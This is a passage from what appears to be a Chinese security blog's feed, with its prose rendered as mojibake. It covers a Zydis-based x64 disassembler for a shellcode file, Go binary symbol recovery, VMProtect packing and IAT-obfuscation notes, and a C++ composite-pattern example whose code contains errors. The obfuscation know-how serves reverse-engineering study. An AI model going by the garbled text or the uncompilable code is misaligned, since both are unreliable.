class="string">&lt;Zydis/Zydis.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">readFileToBuffer</span><span class="params">(<span class="type">const</span> std::string&amp; filepath, std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;&amp; buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">std::ifstream <span class="title">file</span><span class="params">(filepath, std::ios::binary | std::ios::ate)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!file.<span class="built_in">is_open</span>())</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to open file: &quot;</span> &lt;&lt; filepath &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::streamsize fSize = file.<span class="built_in">tellg</span>();</span><br><span class="line">file.<span class="built_in">seekg</span>(<span class="number">0</span>, std::ios::beg);</span><br><span class="line">buffer.<span class="built_in">resize</span>(fSize);</span><br><span class="line"><span class="keyword">if</span> (!file.<span class="built_in">read</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(buffer.<span class="built_in">data</span>()), fSize))</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to read file: &quot;</span> &lt;&lt; filepath &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">file.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printInstructionStructure</span><span class="params">(<span class="type">const</span> ZydisDecodedInstruction&amp; instruction, <span class="type">const</span> ZydisDecodedOperand operands[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Instruction Structure:\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Mnemonic: &quot;</span> &lt;&lt; <span class="built_in">ZydisMnemonicGetString</span>(instruction.mnemonic) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(instruction.length) &lt;&lt; <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Opcode: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(instruction.opcode) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Operand Count Visible: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(instruction.operand_count_visible) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ZyanU8 i = <span class="number">0</span>; i &lt; instruction.operand_count_visible; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> ZydisDecodedOperand&amp; operand = operands[i];</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Operand &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(i) &lt;&lt; <span class="string">&quot;: \n&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (operand.type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ZYDIS_OPERAND_TYPE_REGISTER:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Register\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Register: &quot;</span> &lt;&lt; <span class="built_in">ZydisRegisterGetString</span>(operand.reg.value) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ZYDIS_OPERAND_TYPE_IMMEDIATE:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Immediate\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Value: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; operand.imm.value.u &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ZYDIS_OPERAND_TYPE_MEMORY:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Memory\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Base: &quot;</span> &lt;&lt; <span class="built_in">ZydisRegisterGetString</span>(operand.mem.base) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Index: &quot;</span> &lt;&lt; <span class="built_in">ZydisRegisterGetString</span>(operand.mem.index) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Displacement: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; operand.mem.disp.value &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; (operand.mem.disp.value &gt;= <span class="number">0</span> ? operand.mem.disp.value : -operand.mem.disp.value) &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Unknown\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;-----------------------------------\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ZydisDecoder decoder;</span><br><span class="line"><span class="built_in">ZydisDecoderInit</span>(&amp;decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);</span><br><span class="line"></span><br><span class="line">ZydisFormatter formatter;</span><br><span class="line"><span class="built_in">ZydisFormatterInit</span>(&amp;formatter, ZYDIS_FORMATTER_STYLE_INTEL);</span><br><span class="line"></span><br><span class="line">std::string filePath = <span class="string">&quot;shellcode.bin&quot;</span>;</span><br><span class="line">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; buffer;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">readFileToBuffer</span>(filePath, buffer))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZyanU64 runtime_address = <span class="number">0</span>;</span><br><span class="line">ZyanUSize offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> ZyanUSize length = buffer.<span class="built_in">size</span>();</span><br><span class="line">ZydisDecodedInstruction instruction;</span><br><span class="line">ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">ZYAN_SUCCESS</span>(<span class="built_in">ZydisDecoderDecodeFull</span>(&amp;decoder, buffer.<span class="built_in">data</span>() + offset, length - offset,</span><br><span class="line">&amp;instruction, operands)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%016&quot;</span> PRIX64 <span class="string">&quot;  &quot;</span>, runtime_address);</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">ZydisFormatterFormatInstruction</span>(&amp;formatter, &amp;instruction, operands,</span><br><span class="line">instruction.operand_count_visible, tmp, <span class="built_in">sizeof</span>(tmp),</span><br><span class="line">runtime_address, ZYAN_NULL);</span><br><span class="line"><span class="built_in">puts</span>(tmp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printInstructionStructure</span>(instruction, operands);</span><br><span class="line"></span><br><span class="line">offset += instruction.length;</span><br><span class="line">runtime_address += instruction.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GOé€†å‘å…¥é—¨</title>
      <link href="/posts/356e98d9.html"/>
      <url>/posts/356e98d9.html</url>
      
        <content type="html"><![CDATA[<h1>Golang</h1><p>golang æ˜¯è°·æ­Œå¼€å‘çš„ä¸€ä¸ªé™æ€è¯­è¨€ï¼Œç°åœ¨æœ‰å¾ˆå¤šæ¶æ„ç¨‹åºä½¿ç”¨Goè¯­è¨€å¼€å‘</p><p><a href="https://www.anquanke.com/post/id/214940">GoäºŒè¿›åˆ¶æ–‡ä»¶é€†å‘åˆ†æä»åŸºç¡€åˆ°è¿›é˜¶â€”â€”ç»¼è¿°-å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å°</a></p><h2 id="Goè¯­è¨€åŸºæœ¬ç»“æ„">Goè¯­è¨€åŸºæœ¬ç»“æ„</h2><p>Goè¯­è¨€ä¸­æœ‰äº›ä¿¡æ¯ä¼šä¸€ç›´ä¿ç•™åœ¨ç¨‹åºä¸­ï¼Œç”¨äºå®ç°å•æ–‡ä»¶ç›´æ¥è¿è¡Œè€Œä¸éœ€è¦ç¯å¢ƒï¼ŒåŒæ—¶ç”±äºåå°„å’Œstack traceï¼Œæ‰€ä»¥ä¿ç•™çš„ä¿¡æ¯éå¸¸å¤šï¼Œå¦‚æœæ‰¾åˆ°äº†è¿™äº›ä¿¡æ¯ï¼Œå°±å¯ä»¥ç›´æ¥æ¢å¤ç¬¦å·è¡¨</p><p><a href="https://github.com/0xjiayu/go_parser/blob/master/README_cn.md">go_parser/README_cn.md at master Â· 0xjiayu/go_parser</a></p><p>ç”¨è¿™é‡Œçš„ä»‹ç»æ¥è¯´ï¼ŒåŸºæœ¬ä¿¡æ¯å¦‚ä¸‹ï¼š</p><ul><li>Meta information<ul><li>Go version</li><li>Build ID</li><li>GOROOT</li></ul></li><li>strings and string pointerï¼ˆå­—ç¬¦ä¸²æŒ‡é’ˆï¼‰</li><li>runtime symbol infomation(pclntab)<ul><li>å‡½æ•°åç§°è¡¨</li><li>æºä»£ç è·¯å¾„è¡¨</li></ul></li><li>runtime type infomation</li><li>interface table<ul><li>æ¥å£ç±»å‹</li><li>çœŸå®ç±»å‹ä¸ç»‘å®šæ–¹æ³•</li></ul></li></ul><h3 id="pclntab">pclntab</h3><p>Program Counter Line Tableç¨‹åºè®¡æ•°å™¨è¡Œæ•°æ˜ å°„è¡¨/è¿è¡Œæ—¶ç¬¦å·è¡¨ã€‚ç¨‹åºå‡ºé”™æ—¶ï¼Œruntimeå°†ä»ä¸­å¾—åˆ°å¯¹åº”çš„åŒ…åï¼Œæ–‡ä»¶åï¼Œæ–¹æ³•æˆ–å‡½æ•°ä»¥åŠå‡ºé”™çš„è¡Œï¼Œæœ€åæ‰èƒ½è¾“å‡ºå‡ºæ¥ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰å¾ˆå¤šæœ‰ç”¨çš„ä¿¡æ¯</p><p>è¿™é‡Œæœ€é‡è¦çš„å‡½æ•°è¡¨å’Œå‡½æ•°åç§°è¡¨ï¼Œå®ƒä»¬çš„åç§»éƒ½æ˜¯ç›¸å¯¹äºpclntabè¿›è¡Œçš„</p><h2 id="æ¢å¤ç¬¦å·è¡¨">æ¢å¤ç¬¦å·è¡¨</h2><p><a href="https://github.com/mandiant/GoReSym">mandiant/GoReSym: Go symbol recovery tool</a></p><p><a href="https://cloud.google.com/blog/topics/threat-intelligence/golang-internals-symbol-recovery/">Readyï¼Œ Setï¼Œ Go â€” Golang å†…éƒ¨åŸç†å’Œç¬¦å·æ¢å¤ |Google Cloud åšå®¢</a></p><p><a href="https://github.com/0xjiayu/go_parser">0xjiayu/go_parser: Yet Another Golang binary parser for IDAPro</a></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™å‡ ä¸ªå°±å¤Ÿäº†ï¼Œä½†æ˜¯å¦‚æœåŠ äº†æ··æ·†ï¼ŒæŠŠç¬¦å·è¡¨å’Œç¬¦å·åç§°è¡¨çš„å†…å®¹(åç§»)åˆ äº†ï¼Œé‚£å°±å¾—æ‰‹åŠ¨è¿˜åŸäº†ï¼Œå°±å¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥è¿™ç§è¿˜æ˜¯ç”¨bindiffå’Œsigæ–‡ä»¶å§</p><h2 id="è°ƒç”¨çº¦å®š">è°ƒç”¨çº¦å®š</h2><p><a href="QAQ">æ–½å·¥ä¸­</a></p><h2 id="æŠ€å·§">æŠ€å·§</h2><p>å¯¹äºè¿™ç§æ ¹æœ¬çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œå¯¹å‡½æ•°æµ‹è¯•è¿˜æ˜¯ç”¨é»‘ç›’å§ï¼Œä¸€èˆ¬æ¥è¯´ä¸€ä¸ªç”¨æˆ·å‡½æ•°åé¢å°±æœ‰ä¸€ä¸ªåº“è°ƒç”¨å‡½æ•°ï¼Œç”¨æ±‡ç¼–æµç¨‹å›¾åè€Œå¥½çœ‹ä¸€ç‚¹</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> è¯­è¨€ </category>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMPå£³å­¦ä¹ ç¬”è®°</title>
      <link href="/posts/1a88f77f.html"/>
      <url>/posts/1a88f77f.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>æœ€è¿‘æƒ³å°è¯•å†™ä¸ªä»£ç æ··æ·†å™¨ï¼Œæ‰€ä»¥å°è¯•å…ˆçœ‹çœ‹å¸‚é¢ä¸Šçš„å£³æœ‰å“ªäº›æ“ä½œå¯ä»¥å­¦ä¸€ä¸‹ï¼Œé˜²æ­¢èµ°æ­ªè·¯</p><p><a href="https://www.52pojie.cn/thread-1564978-1-1.html">å¿«é€Ÿè®¤è¯† VMP 3.x ç¬¬ä¸€éƒ¨åˆ† å£³ä»£ç ç¯‡ - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><p><a href="https://www.52pojie.cn/thread-1565126-1-1.html">å¿«é€Ÿè®¤è¯†VMP 3.x ç¬¬äºŒéƒ¨åˆ† ä»£ç å˜å¼‚ç¯‡ - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><p><a href="https://whereisr0da.github.io/blog/posts/2021-02-16-vmp-3/">ğŸ”¥ Quick look around VMP 3.x - Part 3 : Virtualization | r0daâ€™s Blog</a></p><p>çœ‹çš„ä¸»è¦æ˜¯è¿™ä¸‰ç¯‡åšå®¢</p><h2 id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</h2><h3 id="åŠ å£³">åŠ å£³</h3><p>è¿™ä¸ªéƒ¨åˆ†æ˜¯ä¸€èˆ¬çš„å£³éƒ½ä¼šåšçš„æ“ä½œï¼Œå¯¹å¯æ‰§è¡Œæ–‡ä»¶çš„èŠ‚åŒºè¿›è¡Œå‹ç¼©å’ŒåŠ å¯†é˜²æ­¢è¢«é™æ€åˆ†æ</p><p>åŸå§‹èŠ‚åŒºçš„å†…å®¹è¢«æ”¾å…¥.vmp1èŠ‚åŒºï¼Œå«æœ‰è¢«åŠ å¯†çš„èŠ‚åŒºå†…å®¹ï¼Œå£³ä»£ç ï¼ŒèŠ‚åŒºä¿¡æ¯</p><p>VMPä½¿ç”¨ZwProtectVirtualMemoryå‡½æ•°æ¥ä¿®æ”¹èŠ‚åŒºæƒé™ä»è€Œæ‰§è¡Œè§£å¯†ä»£ç </p><h3 id="IATæ··æ·†">IATæ··æ·†</h3><p>åŸå§‹IATè¿˜å­˜åœ¨ï¼Œä½†æ˜¯ä¸ä¼šè¢«ä½¿ç”¨ï¼Œæ‰€æœ‰è°ƒç”¨APIçš„æ“ä½œï¼Œéƒ½ä¼šè¢«è½¬æ¢ä¸ºè¿ç®—æ—¶åŠ¨æ€æ‰§è¡Œ</p><p>å…·ä½“æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call dword ptr ds:[&lt;&amp;targetFunction&gt;]</span><br></pre></td></tr></table></figure><p>å˜ä¸ºç­‰é•¿çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push reg</span><br><span class="line">call apiè§£æå™¨</span><br></pre></td></tr></table></figure><p>apiè§£æå™¨ä¸­é€šè¿‡ä¸€äº›è®¡ç®—å¾—åˆ°åœ°å€ç„¶åç”¨retè·³è½¬åˆ°apiå‡½æ•°ä¸­</p><h2 id="ä»£ç å˜å¼‚">ä»£ç å˜å¼‚</h2><p>VMPä¼šå‘ä»£ç ä¸­åŠ å…¥åƒåœ¾ä»£ç ï¼Œç­‰æ•ˆæ›¿æ¢ï¼Œæ§åˆ¶æµä¿æŠ¤</p><p>å…³äºæ’å…¥åƒåœ¾ä»£ç å’Œä»£ç æ›¿æ¢è¿™éƒ¨åˆ†ä¸æ˜¯å¾ˆæ¸…æ¥šå®ƒæ˜¯æ€ä¹ˆåšçš„ã€‚</p><p>æ§åˆ¶æµä¸­ï¼ŒVMPæ·»åŠ äº†æ›´å¤šæ— æ¡ä»¶è·³è½¬ï¼ŒåŒæ—¶æ‹†åˆ†äº†ä»£ç å—ï¼Œè®©å‡½æ•°å’Œå‡½æ•°äº¤é”™åœ¨ä¸€èµ·ï¼Œä»£ç å—ä¸ä¸€å®šæ˜¯å¯¹é½çš„ï¼Œè¿™å¯¼è‡´äº†é¡ºåºçš„åæ±‡ç¼–å™¨å¾ˆå¯èƒ½å¤±æ•ˆ</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> åé™æ€åˆ†æ </category>
          
          <category> å‹ç¼©å™¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å£³ </tag>
            
            <tag> åè°ƒè¯• </tag>
            
            <tag> è™šæ‹Ÿæœº </tag>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»„åˆæ¨¡å¼</title>
      <link href="/posts/df879792.html"/>
      <url>/posts/df879792.html</url>
      
        <content type="html"><![CDATA[<p>å¦‚æœä½ è¦å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š<br>ä¸€ä¸ªå¡ç‰Œç±»ï¼Œæœ‰ä¸åŒçš„æ•ˆæœï¼Œå¾ˆè‡ªç„¶åœ°å¯ä»¥æƒ³åˆ°ä»¥ä¸‹å®ç°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseCard</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">std::string name;</span><br><span class="line">std::string description;</span><br><span class="line"><span class="type">size_t</span> id;</span><br><span class="line">dword cost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onHandTurnStart</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onTurnStart</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onHandTurnEnd</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onTurnEnd</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">dword <span class="title">onAttacked</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">afterAttacked</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">dword <span class="title">onAttack</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">afterAttack</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myCard</span> : <span class="keyword">public</span> BaseCard&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        player.<span class="built_in">heal</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">player</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">useCard</span><span class="params">(BaseCard&amp; card)</span></span>&#123;</span><br><span class="line">        card.<span class="built_in">onUse</span>();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">TurnStart</span><span class="params">(BaseCard&amp; card)</span></span>&#123;</span><br><span class="line">        card.<span class="built_in">onTurnStart</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ï¼Œå¦‚æœè¦åˆ›é€ æ›´å¤šçš„ä¸ä¸€æ ·çš„å¡ç‰Œï¼Œå°±è¦ä¸€ç›´æ·»åŠ Cardï¼ŒåŒæ—¶ï¼Œå¦‚æœè€ƒè™‘äººç‰©æŠ€èƒ½ï¼Œé“å…·èƒ½åŠ›ï¼Œä¹Ÿè®¸ä¸€ä¸ªæ•ˆæœè¦é‡å†™å¤šæ¬¡ï¼Œæ‰€ä»¥ï¼Œå®Œå…¨å¯ä»¥å°†æ•ˆæœå•ç‹¬æ‹¿å‡ºæ¥å½“ä½œæ–°ç±»ï¼Œç„¶ååœ¨å¯¹åº”äººç‰©/é“å…·/å¡ç‰Œä¸­æ·»åŠ ä¸åŒçš„æ•ˆæœæ¨¡å—</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Effect</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onTurnStart</span><span class="params">()</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onUse</span><span class="params">()</span> </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">Effect</span>() = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AEffect</span> : <span class="keyword">public</span> Effect &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        player.<span class="built_in">heal</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CaposEffect</span> : <span class="keyword">public</span> Effect&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::vector&lt;std::shared_ptr&lt;Effect&gt;&gt; ce;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> effect:ce)&#123;</span><br><span class="line">            effect-&gt;<span class="built_in">onUse</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addEffect</span><span class="params">(std::shared_ptr&lt;Effect&gt;&amp;x)</span></span>&#123;</span><br><span class="line">        ce.<span class="built_in">push_back</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseCard</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">std::string name;</span><br><span class="line">std::string description;</span><br><span class="line"><span class="type">size_t</span> id;</span><br><span class="line">dword cost;</span><br><span class="line">std::shared_ptr&lt;CaposEffect&gt; effects;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onHandTurnStart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        effects-&gt;<span class="built_in">onHandTurnStart</span>();</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        effects-&gt;<span class="built_in">onUse</span>();</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addEffect</span><span class="params">(std::shared_ptr&lt;Effect&gt;&amp;x)</span></span>&#123;</span><br><span class="line">        effects.<span class="built_in">addEffect</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myCard</span> : <span class="keyword">public</span> BaseCard&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        player.<span class="built_in">heal</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å®ç°äº†ä¸¤ç§å¯¹è±¡ä¹‹é—´çš„è§£è€¦ï¼Œä¸”å¯ä»¥ä¸ºeffectåˆ›å»ºeffectç»„ï¼Œå®ç°å¤šç§æ•ˆæœçš„ç»„åˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> é¢å‘å¯¹è±¡åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é©±åŠ¨å¼€å‘å…¥é—¨</title>
      <link href="/posts/d2620136.html"/>
      <url>/posts/d2620136.html</url>
      
